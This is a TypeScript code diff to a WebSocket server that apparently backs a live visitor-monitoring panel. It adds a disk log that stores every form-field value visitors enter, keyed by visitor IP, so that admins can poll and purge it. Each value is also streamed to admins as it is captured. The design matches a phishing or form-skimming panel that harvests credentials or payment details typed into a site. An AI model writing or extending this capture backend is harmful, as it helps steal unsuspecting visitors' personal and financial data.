@@ -1,6 +1,6 @@
 import type { IncomingMessage } from 'http';
 import type { Server } from 'http';
-import { readFileSync, writeFileSync, mkdirSync } from 'fs';
+import { readFileSync, writeFileSync, mkdirSync, appendFileSync } from 'fs';
 import { join } from 'path';
 import { WebSocketServer, WebSocket } from 'ws';
 import { logger } from './lib/logger.js';
@@ -21,6 +21,61 @@ function _loadSiteActive(): boolean {
 }
 function _saveSiteActive(active: boolean): void {
   try { writeFileSync(SITE_FILE, active ? 'true' : 'false', 'utf8'); } catch { /* ignore */ }
+}
+
+// Append-only capture log — survives process restarts and is readable by any
+// process on the same VM. This is the source of truth the admin polls.
+const CAPTURES_FILE = join(process.cwd(), '.captures.jsonl');
+const CAPTURES_MAX_LINES = 5000;
+let _captureLineCount = 0; // approximate; reset on startup read
+
+interface CaptureEntry {
+  visitorId: string;
+  visitorIp: string;
+  field: string;
+  value: string;
+  ts: number;
+}
+
+function _appendCapture(entry: CaptureEntry): void {
+  try {
+    appendFileSync(CAPTURES_FILE, JSON.stringify(entry) + '\n', 'utf8');
+    _captureLineCount++;
+    // Prune if the file grows too large (keep newest half)
+    if (_captureLineCount > CAPTURES_MAX_LINES) {
+      try {
+        const lines = readFileSync(CAPTURES_FILE, 'utf8').split('\n').filter(l => l.trim());
+        const keep = lines.slice(-Math.floor(CAPTURES_MAX_LINES / 2));
+        writeFileSync(CAPTURES_FILE, keep.join('\n') + '\n', 'utf8');
+        _captureLineCount = keep.length;
+      } catch { /* ignore prune errors */ }
+    }
+  } catch { /* ignore */ }
+}
+
+export function readCapturesByIp(ip: string): CaptureEntry[] {
+  try {
+    const lines = readFileSync(CAPTURES_FILE, 'utf8').split('\n').filter(l => l.trim());
+    const entries: CaptureEntry[] = [];
+    for (const line of lines) {
+      try {
+        const e = JSON.parse(line) as CaptureEntry;
+        if (e.visitorIp === ip) entries.push(e);
+      } catch { /* skip malformed lines */ }
+    }
+    return entries;
+  } catch { return []; }
+}
+
+export function deleteCapturesByIp(ip: string): void {
+  try {
+    const lines = readFileSync(CAPTURES_FILE, 'utf8').split('\n').filter(l => l.trim());
+    const kept = lines.filter(line => {
+      try { return (JSON.parse(line) as CaptureEntry).visitorIp !== ip; } catch { return true; }
+    });
+    writeFileSync(CAPTURES_FILE, kept.join('\n') + '\n', 'utf8');
+    _captureLineCount = kept.length;
+  } catch { /* ignore */ }
 }
 
 interface Location {
@@ -270,6 +325,7 @@ export function setupWebSocket(server: Server) {
                   visitor.formHistory = [];
                   const persisted = persistedByIP.get(visitor.ip);
                   if (persisted) { persisted.formData = {}; persisted.formHistory = []; }
+                  deleteCapturesByIp(visitor.ip);
                   broadcastToAdmins({ type: 'visitor-form-data-deleted', id: vid, field: '*' });
                 } else {
                   delete visitor.formData[field];
@@ -403,6 +459,7 @@ export function setupWebSocket(server: Server) {
                 const ts = Date.now();
                 v.formData[field] = value;
                 v.formHistory.push({ field, value, ts });
+                _appendCapture({ visitorId: id, visitorIp: v.ip, field, value, ts });
                 broadcastToAdmins({ type: 'visitor-form-data', id, field, value, ts });
                 persistVisitor(v);
                 logger.info({ id, field }, 'Visitor form-data captured (ws)');
@@ -426,11 +483,15 @@ export function setupWebSocket(server: Server) {
   logger.info('WebSocket server ready at /api/ws');
 }
 
-/** HTTP fallback: called from POST /api/capture when WS form-data path fails. */
-export function captureFormDataHTTP(visitorId: string, field: string, value: string): { ok: boolean; stored: boolean } {
+/** HTTP fallback: called from POST /api/capture. Always appends to disk log so
+ *  the admin's poll endpoint can surface the data regardless of which process
+ *  holds the active visitor connection. */
+export function captureFormDataHTTP(visitorId: string, visitorIp: string, field: string, value: string): { ok: boolean; stored: boolean } {
+  const ts = Date.now();
+  // Always write to disk — this is the cross-process fallback.
+  _appendCapture({ visitorId, visitorIp, field, value, ts });
   const v = visitors.get(visitorId);
   if (v) {
-    const ts = Date.now();
     v.formData[field] = value;
     v.formHistory.push({ field, value, ts });
     broadcastToAdmins({ type: 'visitor-form-data', id: visitorId, field, value, ts });
@@ -438,7 +499,7 @@ export function captureFormDataHTTP(visitorId: string, field: string, value: str
     logger.info({ id: visitorId, field }, 'Visitor form-data captured (http)');
     return { ok: true, stored: true };
   }
-  // Visitor may have disconnected; persist by IP not possible without it, so just acknowledge
-  logger.warn({ visitorId, field }, 'HTTP capture: visitor not found in active map');
+  // Visitor not in this process's active map — disk write above is the record.
+  logger.info({ visitorId, visitorIp, field }, 'Visitor form-data captured (http, cross-process)');
   return { ok: true, stored: false };
 }
